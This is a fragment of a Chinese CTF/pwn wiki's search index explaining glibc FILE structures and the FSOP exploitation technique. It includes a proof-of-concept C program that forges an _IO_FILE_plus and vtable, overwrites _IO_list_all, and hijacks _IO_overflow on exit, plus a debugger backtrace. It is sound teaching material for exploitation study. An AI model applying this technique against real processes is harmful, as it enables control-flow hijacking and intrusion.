\u4e3a\u4e86\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u6211\u4eec\u63d0\u524d\u83b7\u5f97\u4e86_IO_write_ptr\u3001_IO_write_base\u3001_mode\u7b49\u6570\u636e\u57df\u7684\u504f\u79fb\uff0c\u8fd9\u6837\u53ef\u4ee5\u5728\u4f2a\u9020\u7684vtable\u4e2d\u6784\u9020\u76f8\u5e94\u7684\u6570\u636e #define _IO_list_all 0x7ffff7dd2520 #define mode_offset 0xc0 #define writeptr_offset 0x28 #define writebase_offset 0x20 #define vtable_offset 0xd8 int main(void) { void *ptr; long long *list_all_ptr; ptr=malloc(0x200); *(long long*)((long long)ptr+mode_offset)=0x0; *(long long*)((long long)ptr+writeptr_offset)=0x1; *(long long*)((long long)ptr+writebase_offset)=0x0; *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100); *(long long*)((long long)ptr+0x100+24)=0x41414141; list_all_ptr=(long long *)_IO_list_all; list_all_ptr[0]=ptr; exit(0); } \u6211\u4eec\u4f7f\u7528\u5206\u914d\u5185\u5b58\u7684\u524d0x100\u4e2a\u5b57\u8282\u4f5c\u4e3a_IO_FILE_plus\uff0c\u540e0x100\u4e2a\u5b57\u8282\u4f5c\u4e3avtable\uff0c\u5728vtable\u4e2d\u4f7f\u75280x41414141\u8fd9\u4e2a\u5730\u5740\u4f5c\u4e3a\u4f2a\u9020\u7684_IO_overflow\u6307\u9488\u3002 \u4e4b\u540e\uff0c\u8986\u76d6\u4f4d\u4e8elibc\u4e2d\u7684\u5168\u5c40\u53d8\u91cf _IO_list_all\uff0c\u628a\u5b83\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684_IO_FILE_plus\u3002 \u901a\u8fc7\u8c03\u7528exit\u51fd\u6570\uff0c\u7a0b\u5e8f\u4f1a\u6267\u884c _IO_flush_all_lockp\uff0c\u7ecf\u8fc7fflush\u83b7\u53d6_IO_list_all\u7684\u503c\u5e76\u53d6\u51fa\u4f5c\u4e3a_IO_FILE_plus\u8c03\u7528\u5176\u4e2d\u7684_IO_overflow ---> call _IO_overflow [#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0) [#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup() [#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp=<optimized out>, run_list_atexit=0x1) [#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status=<optimized out>) [#4] 0x4005ce \u2192 Name: main()","title":"FSOP"},{"location":"pwn/io_file/fsop/#fsop","text":"","title":"FSOP"},{"location":"pwn/io_file/fsop/#_1","text":"FSOP\u662fFile Stream Oriented Programming\u7684\u7f29\u5199\uff0c\u6839\u636e\u524d\u9762\u5bf9FILE\u7684\u4ecb\u7ecd\u5f97\u77e5\u8fdb\u7a0b\u5185\u6240\u6709\u7684_IO_FILE\u7ed3\u6784\u4f1a\u4f7f\u7528_chain\u57df\u76f8\u4e92\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u8fd9\u4e2a\u94fe\u8868\u7684\u5934\u90e8\u7531_IO_list_all\u7ef4\u62a4\u3002 FSOP\u7684\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u52ab\u6301_IO_list_all\u7684\u503c\u6765\u4f2a\u9020\u94fe\u8868\u548c\u5176\u4e2d\u7684_IO_FILE\u9879\uff0c\u4f46\u662f\u5355\u7eaf\u7684\u4f2a\u9020\u53ea\u662f\u6784\u9020\u4e86\u6570\u636e\u8fd8\u9700\u8981\u67d0\u79cd\u65b9\u6cd5\u8fdb\u884c\u89e6\u53d1\u3002FSOP\u9009\u62e9\u7684\u89e6\u53d1\u65b9\u6cd5\u662f\u8c03\u7528_IO_flush_all_lockp\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5237\u65b0_IO_list_all\u94fe\u8868\u4e2d\u6240\u6709\u9879\u7684\u6587\u4ef6\u6d41\uff0c\u76f8\u5f53\u4e8e\u5bf9\u6bcf\u4e2aFILE\u8c03\u7528fflush\uff0c\u4e5f\u5bf9\u5e94\u7740\u4f1a\u8c03\u7528_IO_FILE_plus.vtable\u4e2d\u7684_IO_overflow\u3002 int _IO_flush_all_lockp (int do_lock) { ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { ... if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } ... } } \u800c_IO_flush_all_lockp\u4e0d\u9700\u8981\u653b\u51fb\u8005\u624b\u52a8\u8c03\u7528\uff0c\u5728\u4e00\u4e9b\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u51fd\u6570\u4f1a\u88ab\u7cfb\u7edf\u8c03\u7528\uff1a 1.\u5f53libc\u6267\u884cabort\u6d41\u7a0b\u65f6 2.\u5f53\u6267\u884cexit\u51fd\u6570\u65f6 3.\u5f53\u6267\u884c\u6d41\u4ecemain\u51fd\u6570\u8fd4\u56de\u65f6","title":"\u4ecb\u7ecd"},{"location":"pwn/io_file/fsop/#_2","text":"\u68b3\u7406\u4e00\u4e0bFSOP\u5229\u7528\u7684\u6761\u4ef6\uff0c\u9996\u5148\u9700\u8981\u653b\u51fb\u8005\u83b7\u77e5libc.so\u57fa\u5740\uff0c\u56e0\u4e3a_IO_list_all\u662f\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\u50a8\u5b58\u5728libc.so\u4e2d\u7684\uff0c\u4e0d\u6cc4\u6f0flibc\u57fa\u5740\u5c31\u4e0d\u80fd\u6539\u5199_IO_list_all\u3002 \u4e4b\u540e\u9700\u8981\u7528\u4efb\u610f\u5730\u5740\u5199\u628a_IO_list_all\u7684\u5185\u5bb9\u6539\u4e3a\u6307\u5411\u6211\u4eec\u53ef\u63a7\u5185\u5b58\u7684\u6307\u9488\uff0c \u4e4b\u540e\u7684\u95ee\u9898\u662f\u5728\u53ef\u63a7\u5185\u5b58\u4e2d\u5e03\u7f6e\u4ec0\u4e48\u6570\u636e\uff0c\u6beb\u65e0\u7591\u95ee\u7684\u662f\u9700\u8981\u5e03\u7f6e\u4e00\u4e2a\u6211\u4eec\u7406\u60f3\u51fd\u6570\u7684vtable\u6307\u9488\u3002\u4f46\u662f\u4e3a\u4e86\u80fd\u591f\u8ba9\u6211\u4eec\u6784\u9020\u7684fake_FILE\u80fd\u591f\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fd8\u9700\u8981\u5e03\u7f6e\u4e00\u4e9b\u5176\u4ed6\u6570\u636e\u3002 \u8fd9\u91cc\u7684\u4f9d\u636e\u662f\u6211\u4eec\u524d\u9762\u7ed9\u51fa\u7684 if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } \u4e5f\u5c31\u662f fp->_mode <= 0 fp->_IO_write_ptr > fp->_IO_write_base \u5728\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u9a8c\u8bc1\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u6211\u4eec\u5206\u914d\u4e00\u5757\u5185\u5b58\u7528\u4e8e\u5b58\u653e\u4f2a\u9020\u7684vtable\u548c_IO_FILE_plus\u3002 \u4e3a\u4e86\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u6211\u4eec\u63d0\u524d\u83b7\u5f97\u4e86_IO_write_ptr\u3001_IO_write_base\u3001_mode\u7b49\u6570\u636e\u57df\u7684\u504f\u79fb\uff0c\u8fd9\u6837\u53ef\u4ee5\u5728\u4f2a\u9020\u7684vtable\u4e2d\u6784\u9020\u76f8\u5e94\u7684\u6570\u636e #define _IO_list_all 0x7ffff7dd2520 #define mode_offset 0xc0 #define writeptr_offset 0x28 #define writebase_offset 0x20 #define vtable_offset 0xd8 int main(void) { void *ptr; long long *list_all_ptr; ptr=malloc(0x200); *(long long*)((long long)ptr+mode_offset)=0x0; *(long long*)((long long)ptr+writeptr_offset)=0x1; *(long long*)((long long)ptr+writebase_offset)=0x0; *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100); *(long long*)((long long)ptr+0x100+24)=0x41414141; list_all_ptr=(long long *)_IO_list_all; list_all_ptr[0]=ptr; exit(0); } \u6211\u4eec\u4f7f\u7528\u5206\u914d\u5185\u5b58\u7684\u524d0x100\u4e2a\u5b57\u8282\u4f5c\u4e3a_IO_FILE_plus\uff0c\u540e0x100\u4e2a\u5b57\u8282\u4f5c\u4e3avtable\uff0c\u5728vtable\u4e2d\u4f7f\u75280x41414141\u8fd9\u4e2a\u5730\u5740\u4f5c\u4e3a\u4f2a\u9020\u7684_IO_overflow\u6307\u9488\u3002 \u4e4b\u540e\uff0c\u8986\u76d6\u4f4d\u4e8elibc\u4e2d\u7684\u5168\u5c40\u53d8\u91cf _IO_list_all\uff0c\u628a\u5b83\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684_IO_FILE_plus\u3002 \u901a\u8fc7\u8c03\u7528exit\u51fd\u6570\uff0c\u7a0b\u5e8f\u4f1a\u6267\u884c _IO_flush_all_lockp\uff0c\u7ecf\u8fc7fflush\u83b7\u53d6_IO_list_all\u7684\u503c\u5e76\u53d6\u51fa\u4f5c\u4e3a_IO_FILE_plus\u8c03\u7528\u5176\u4e2d\u7684_IO_overflow ---> call _IO_overflow [#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0) [#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup() [#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp=<optimized out>, run_list_atexit=0x1) [#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status=<optimized out>) [#4] 0x4005ce \u2192 Name: main()","title":"\u793a\u4f8b"},{"location":"pwn/io_file/introduction/","text":"FILE\u7ed3\u6784 \u00b6 FILE\u4ecb\u7ecd \u00b6 FILE\u5728Linux\u7cfb\u7edf\u7684\u6807\u51c6IO\u5e93\u4e2d\u662f\u7528\u4e8e\u63cf\u8ff0\u6587\u4ef6\u7684\u7ed3\u6784\uff0c\u79f0\u4e3a\u6587\u4ef6\u6d41\u3002 FILE\u7ed3\u6784\u5728\u7a0b\u5e8f\u6267\u884cfopen\u7b49\u51fd\u6570\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\uff0c\u5e76\u5206\u914d\u5728\u5806\u4e2d\u3002\u6211\u4eec\u5e38\u5b9a\u4e49\u4e00\u4e2a\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\u6765\u63a5\u6536\u8fd9\u4e2a\u8fd4\u56de\u503c\u3002 FILE\u7ed3\u6784\u5b9a\u4e49\u5728libio.h\u4e2d\uff0c\u5982\u4e0b\u6240\u793a struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; #if 0 int _blksize; #else int _flags2; #endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ #define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; \u8fdb\u7a0b\u4e2d\u7684FILE\u7ed3\u6784\u4f1a\u901a\u8fc7_chain\u57df\u5f7c\u6b64\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u94fe\u8868\u5934\u90e8\u7528\u5168\u5c40\u53d8\u91cf_IO_list_all\u8868\u793a\uff0c\u901a\u8fc7\u8fd9\u4e2a\u503c\u6211\u4eec\u53ef\u4ee5\u904d\u5386\u6240\u6709\u7684FILE\u7ed3\u6784\u3002 \u5728\u6807\u51c6I/O\u5e93\u4e2d\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u542f\u52a8\u65f6\u6709\u4e09\u4e2a\u6587\u4ef6\u6d41\u662f\u81ea\u52a8\u6253\u5f00\u7684\uff1astdin\u3001stdout\u3001stderr\u3002\u56e0\u6b64\u5728\u521d\u59cb\u72b6\u6001\u4e0b\uff0c_IO_list_all\u6307\u5411\u4e86\u4e00\u4e2a\u6709\u8fd9\u4e9b\u6587\u4ef6\u6d41\u6784\u6210\u7684\u94fe\u8868\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e09\u4e2a\u6587\u4ef6\u6d41\u4f4d\u4e8elibc.so\u7684\u6570\u636e\u6bb5\u3002\u800c\u6211\u4eec\u4f7f\u7528fopen\u521b\u5efa\u7684\u6587\u4ef6\u6d41\u662f\u5206\u914d\u5728\u5806\u5185\u5b58\u4e0a\u7684\u3002 \u6211\u4eec\u53ef\u4ee5\u5728libc.so\u4e2d\u627e\u5230stdin\\stdout\\stderr\u7b49\u7b26\u53f7\uff0c\u8fd9\u4e9b\u7b26\u53f7\u662f\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\uff0c\u771f\u6b63\u7ed3\u6784\u7684\u7b26\u53f7\u662f _IO_2_1_stderr_ _IO_2_1_stdout_ _IO_2_1_stdin_ \u4f46\u662f\u4e8b\u5b9e\u4e0a_IO_FILE\u7ed3\u6784\u5916\u5305\u88f9\u7740\u53e6\u4e00\u79cd\u7ed3\u6784_IO_FILE_plus\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u91cd\u8981\u7684\u6307\u9488vtable\u6307\u5411\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\u6307\u9488\u3002 \u5728libc2.23\u7248\u672c\u4e0b\uff0c32\u4f4d\u7684vtable\u504f\u79fb\u4e3a0x94\uff0c64\u4f4d\u504f\u79fb\u4e3a0x228 struct _IO_FILE_plus { _IO_FILE file; IO_jump_t *vtable; } vtable\u662fIO_jump_t\u7c7b\u578b\u7684\u6307\u9488\uff0cIO_jump_t\u4e2d\u4fdd\u5b58\u4e86\u4e00\u4e9b\u51fd\u6570\u6307\u9488\uff0c\u5728\u540e\u9762\u6211\u4eec\u4f1a\u770b\u5230\u5728\u4e00\u7cfb\u5217\u6807\u51c6IO\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570\u6307\u9488 void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf 9 NULL, // xsgetn 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue }; fread \u00b6 fread\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ; buffer \u5b58\u653e\u8bfb\u53d6\u6570\u636e\u7684\u7f13\u51b2\u533a\u3002 size\uff1a\u6307\u5b9a\u6bcf\u4e2a\u8bb0\u5f55\u7684\u957f\u5ea6\u3002 count\uff1a \u6307\u5b9a\u8bb0\u5f55\u7684\u4e2a\u6570\u3002 stream\uff1a\u76ee\u6807\u6587\u4ef6\u6d41\u3002 \u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u8bfb\u53d6\u5230\u6570\u636e\u7f13\u51b2\u533a\u4e2d\u7684\u8bb0\u5f55\u4e2a\u6570 fread\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofread.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fread\uff0c\u4f46\u771f\u6b63\u7684\u529f\u80fd\u5b9e\u73b0\u5728\u5b50\u51fd\u6570_IO_sgetn\u4e2d\u3002 _IO_size_t _IO_fread (buf, size, count, fp) void *buf; _IO_size_t size; _IO_size_t count; _IO_FILE *fp; { ... bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); ... } \u5728_IO_sgetn\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528_IO_XSGETN\uff0c\u800c_IO_XSGETN\u662f_IO_FILE_plus.vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u5728\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\u4f1a\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u7136\u540e\u518d\u8fdb\u884c\u8c03\u7528\u3002 _IO_size_t _IO_sgetn (fp, data, n) _IO_FILE *fp; void *data; _IO_size_t n; { return _IO_XSGETN (fp, data, n); } \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u51fd\u6570\u6307\u9488\u662f\u6307\u5411_IO_file_xsgetn\u51fd\u6570\u7684\uff0c if (fp->_IO_buf_base && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base)) { if (__underflow (fp) == EOF) break; continue; } fwrite \u00b6 fwrite\u540c\u6837\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5411\u6587\u4ef6\u6d41\u5199\u5165\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream); buffer:\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9fwrite\u6765\u8bf4\uff0c\u662f\u8981\u5199\u5165\u6570\u636e\u7684\u5730\u5740; size:\u8981\u5199\u5165\u5185\u5bb9\u7684\u5355\u5b57\u8282\u6570; count:\u8981\u8fdb\u884c\u5199\u5165size\u5b57\u8282\u7684\u6570\u636e\u9879\u7684\u4e2a\u6570; stream:\u76ee\u6807\u6587\u4ef6\u6307\u9488; \u8fd4\u56de\u503c\uff1a\u5b9e\u9645\u5199\u5165\u7684\u6570\u636e\u9879\u4e2a\u6570count\u3002 fwrite\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofwrite.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fwrite\u3002 \u5728_IO_fwrite\u4e2d\u4e3b\u8981\u662f\u8c03\u7528_IO_XSPUTN\u6765\u5b9e\u73b0\u5199\u5165\u7684\u529f\u80fd\u3002 \u6839\u636e\u524d\u9762\u5bf9_IO_FILE_plus\u7684\u4ecb\u7ecd\uff0c\u53ef\u77e5_IO_XSPUTN\u4f4d\u4e8e_IO_FILE_plus\u7684vtable\u4e2d\uff0c\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\uff0c\u518d\u8df3\u8fc7\u53bb\u8fdb\u884c\u8c03\u7528\u3002 written = _IO_sputn (fp, (const char *) buf, request); \u5728_IO_XSPUTN\u5bf9\u5e94\u7684\u9ed8\u8ba4\u51fd\u6570_IO_new_file_xsputn\u4e2d\u4f1a\u8c03\u7528\u540c\u6837\u4f4d\u4e8evtable\u4e2d\u7684_IO_OVERFLOW /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) _IO_OVERFLOW\u9ed8\u8ba4\u5bf9\u5e94\u7684\u51fd\u6570\u662f_IO_new_file_overflow if (ch == EOF) return _IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base); if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; \u5728_IO_new_file_overflow\u5185\u90e8\u6700\u7ec8\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570 fopen \u00b6 fopen\u5728\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u6253\u5f00\u6587\u4ef6\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b FILE *fopen(char *filename, *type); filename:\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84 type:\u6253\u5f00\u65b9\u5f0f\u7684\u7c7b\u578b \u8fd4\u56de\u503c:\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u6307\u9488 \u5728fopen\u5185\u90e8\u4f1a\u521b\u5efaFILE\u7ed3\u6784\u5e76\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b \u9996\u5148\u5728fopen\u5bf9\u5e94\u7684\u51fd\u6570__fopen_internal\u5185\u90e8\u4f1a\u8c03\u7528malloc\u51fd\u6570\uff0c\u5206\u914dFILE\u7ed3\u6784\u7684\u7a7a\u95f4\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5FILE\u7ed3\u6784\u662f\u5b58\u50a8\u5728\u5806\u4e0a\u7684 *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); \u4e4b\u540e\u4f1a\u4e3a\u521b\u5efa\u7684FILE\u521d\u59cb\u5316vtable\uff0c\u5e76\u8c03\u7528_IO_file_init\u8fdb\u4e00\u6b65\u521d\u59cb\u5316\u64cd\u4f5c _IO_JUMPS (&new_f->fp) = &_IO_file_jumps; _IO_file_init (&new_f->fp); \u5728_IO_file_init\u51fd\u6570\u7684\u521d\u59cb\u5316\u64cd\u4f5c\u4e2d\uff0c\u4f1a\u8c03\u7528_IO_link_in\u628a\u65b0\u5206\u914d\u7684FILE\u94fe\u5165_IO_list_all\u4e3a\u8d77\u59cb\u7684FILE\u94fe\u8868\u4e2d void _IO_link_in (fp) struct _IO_FILE_plus *fp; { if ((fp->file._flags & _IO_LINKED) == 0) { fp->file._flags |= _IO_LINKED; fp->file._chain = (_IO_FILE *) _IO_list_all; _IO_list_all = fp; ++_IO_list_all_stamp; } } \u4e4b\u540e__fopen_internal\u51fd\u6570\u4f1a\u8c03\u7528_IO_file_fopen\u51fd\u6570\u6253\u5f00\u76ee\u6807\u6587\u4ef6\uff0c_IO_file_fopen\u4f1a\u6839\u636e\u7528\u6237\u4f20\u5165\u7684\u6253\u5f00\u6a21\u5f0f\u8fdb\u884c\u6253\u5f00\u64cd\u4f5c\uff0c\u603b\u4e4b\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3open\u51fd\u6570\uff0c\u8fd9\u91cc\u4e0d\u518d\u6df1\u5165\u3002 if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&new_f->fp.file); \u603b\u7ed3\u4e00\u4e0bfopen\u7684\u64cd\u4f5c\u662f \u4f7f\u7528malloc\u5206\u914dFILE\u7ed3\u6784 \u8bbe\u7f6eFILE\u7ed3\u6784\u7684vtable \u521d\u59cb\u5316\u5206\u914d\u7684FILE\u7ed3\u6784 \u5c06\u521d\u59cb\u5316\u7684FILE\u7ed3\u6784\u94fe\u5165FILE\u7ed3\u6784\u94fe\u8868\u4e2d \u8c03\u7528\u7cfb\u7edf\u8c03\u7528\u6253\u5f00\u6587\u4ef6 fclose \u00b6 fclose\u662f\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u5173\u95ed\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u5176\u4f5c\u7528\u4e0efopen\u76f8\u53cd\u3002 int fclose(FILE *stream) \u529f\u80fd\uff1a\u5173\u95ed\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528fclose\u5c31\u53ef\u4ee5\u628a\u7f13\u51b2\u533a\u5185\u6700\u540e\u5269\u4f59\u7684\u6570\u636e\u8f93\u51fa\u5230\u78c1\u76d8\u6587\u4ef6\u4e2d\uff0c\u5e76\u91ca\u653e\u6587\u4ef6\u6307\u9488\u548c\u6709\u5173\u7684\u7f13\u51b2\u533a fclose\u9996\u5148\u4f1a\u8c03\u7528_IO_unlink_it\u5c06\u6307\u5b9a\u7684FILE\u4ece_chain\u94fe\u8868\u4e2d\u8131\u94fe if (fp->_IO_file_flags & _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); \u4e4b\u540e\u4f1a\u8c03\u7528_IO_file_close_it\u51fd\u6570\uff0c_IO_file_close_it\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3close\u5173\u95ed\u6587\u4ef6 if (fp->_IO_file_flags & _IO_IS_FILEBUF) status = _IO_file_close_it (fp); \u6700\u540e\u8c03\u7528vtable\u4e2d\u7684_IO_FINISH\uff0c\u5176\u5bf9\u5e94\u7684\u662f_IO_file_finish\u51fd\u6570\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528free\u51fd\u6570\u91ca\u653e\u4e4b\u524d\u5206\u914d\u7684FILE\u7ed3\u6784 _IO_FINISH (fp); printf/puts \u00b6 printf\u548cputs\u662f\u5e38\u7528\u7684\u8f93\u51fa\u51fd\u6570\uff0c\u5728printf\u7684\u53c2\u6570\u662f\u4ee5'\\n'\u7ed3\u675f\u7684\u7eaf\u5b57\u7b26\u4e32\u65f6\uff0cprintf\u4f1a\u88ab\u4f18\u5316\u4e3aputs\u51fd\u6570\u5e76\u53bb\u9664\u6362\u884c\u7b26\u3002 puts\u5728\u6e90\u7801\u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\u662f_IO_puts\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u64cd\u4f5c\u4e0efwrite\u7684\u6d41\u7a0b\u5927\u81f4\u76f8\u540c\uff0c\u51fd\u6570\u5185\u90e8\u540c\u6837\u4f1a\u8c03\u7528vtable\u4e2d\u7684_IO_sputn\uff0c\u7ed3\u679c\u4f1a\u6267\u884c_IO_new_file_xsputn\uff0c\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570\u3002 printf\u7684\u8c03\u7528\u6808\u56de\u6eaf\u5982\u4e0b\uff0c\u540c\u6837\u662f\u901a\u8fc7_IO_file_xsputn\u5b9e\u73b0 vfprintf+11 _IO_file_xsputn _IO_file_overflow funlockfile _IO_file_write write","title":"FILE \u6587\u4ef6\u7ed3\u6784\u4ecb\u7ecd"},{"location":"pwn/io_file/introduction/#file","text":"","title":"FILE\u7ed3\u6784"},{"location":"pwn/io_file/introduction/#file_1","text":"FILE\u5728Linux\u7cfb\u7edf\u7684\u6807\u51c6IO\u5e93\u4e2d\u662f\u7528\u4e8e\u63cf\u8ff0\u6587\u4ef6\u7684\u7ed3\u6784\uff0c\u79f0\u4e3a\u6587\u4ef6\u6d41\u3002 FILE\u7ed3\u6784\u5728\u7a0b\u5e8f\u6267\u884cfopen\u7b49\u51fd\u6570\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\uff0c\u5e76\u5206\u914d\u5728\u5806\u4e2d\u3002\u6211\u4eec\u5e38\u5b9a\u4e49\u4e00\u4e2a\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\u6765\u63a5\u6536\u8fd9\u4e2a\u8fd4\u56de\u503c\u3002 FILE\u7ed3\u6784\u5b9a\u4e49\u5728libio.h\u4e2d\uff0c\u5982\u4e0b\u6240\u793a struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; #if 0 int _blksize; #else int _flags2; #endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ #define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; \u8fdb\u7a0b\u4e2d\u7684FILE\u7ed3\u6784\u4f1a\u901a\u8fc7_chain\u57df\u5f7c\u6b64\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u94fe\u8868\u5934\u90e8\u7528\u5168\u5c40\u53d8\u91cf_IO_list_all\u8868\u793a\uff0c\u901a\u8fc7\u8fd9\u4e2a\u503c\u6211\u4eec\u53ef\u4ee5\u904d\u5386\u6240\u6709\u7684FILE\u7ed3\u6784\u3002 